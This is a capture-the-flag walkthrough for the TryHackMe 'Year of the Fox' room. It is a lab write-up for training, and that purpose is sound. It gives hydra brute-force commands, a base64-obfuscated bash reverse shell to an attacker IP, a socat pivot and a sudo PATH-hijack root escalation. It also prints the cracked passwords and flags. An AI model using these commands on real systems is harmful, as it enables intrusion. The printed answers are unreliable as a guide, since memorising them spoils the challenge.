
# 🦊 TryHackMe: Year of the Fox (Hard)

> A multi-layered CTF challenge combining brute force, Samba enumeration, HTTP basic auth, remote code execution, SSH tunneling, and PATH hijacking for root privilege escalation.

---

## 🎯 Objectives

- Enumerate exposed services
- Brute-force login credentials
- Identify RCE vulnerability in web application
- Use SSH tunneling to pivot access
- Escalate privileges using `sudo` and `PATH` hijack
- TO find web,user,root flags.

---

## 🔧 Tools Used

- `nmap`, `enum4linux`, `hydra`, `burp`, `linpeas`
- `socat`, `ssh`, `find`

---

## 🔍 Scanning & Enumeration

Nmap scan:
```bash
nmap -A -sV 10.10.172.81
```

Discovered:
- Port 80 – Apache (with basic auth)
- Port 139/445 – Samba (workgroup: YEAROFTHEFOX)
- Port 7000 – OpenSSH

Ran enum4linux:
```bash
enum4linux -a 10.10.172.81
```

Discovered users:
- `fox`
- `rascal`

---

## 🔐 Brute Force Login (HTTP Basic Auth)

Used `hydra` to brute-force credentials:
```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.172.81 http-head /
```
and found password: `gunit`.

Logged in as **rascal**.

---

## 💥 Remote Code Execution

After login, encountered a "Search System".

Captured request using Burp Suite.  
Discovered **RCE** in search parameter.  
Gained reverse shell and found **Web Flag** using `echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjEwNi43My8xMjM0IDA+JjEiCg== | base64 -d | bash`:
```
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
```

---

## 🔄 SSH Port Forwarding & Pivot

After running linpeas:
Discovered local-only SSH on 127.0.0.1:22  
Used socat to forward:
```bash
socat tcp-listen:7000,reuseaddr,fork tcp:127.0.0.1:22
```

Then brute-forced user `fox`:
```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.172.81:7000
```
Found password : `biteme`.
Logged in via SSH and grabbed **User Flag**:
```
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```

---

## 🔼 Privilege Escalation via PATH Hijack

Checked `sudo -l`:
```bash
User fox may run: /sbin/shutdown
```

Identified that `shutdown` runs `poweroff`.

Replaced with custom script:
```bash
echo /bin/bash > poweroff
chmod +x poweroff
export PATH=$(pwd):$PATH
sudo shutdown
```

Gained **root shell** ✅

---

## 🔍 Root Flag Hunt

Initial `root.txt` said:
> Not here -- go find!

Searched using:
```bash
find / -type f -iname '*root*' 2>/dev/null
```

Found and captured final **Root Flag**:
```
THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
```

---

## 📚 What I Learned

- Enumerating users via SMB and brute-forcing HTTP/SSH credentials
- Discovering RCE in POST requests
- SSH tunneling with `socat`
- Abusing PATH manipulation to override `poweroff`
- Root flag recon using `find`

---

✅ End of Walkthrough.
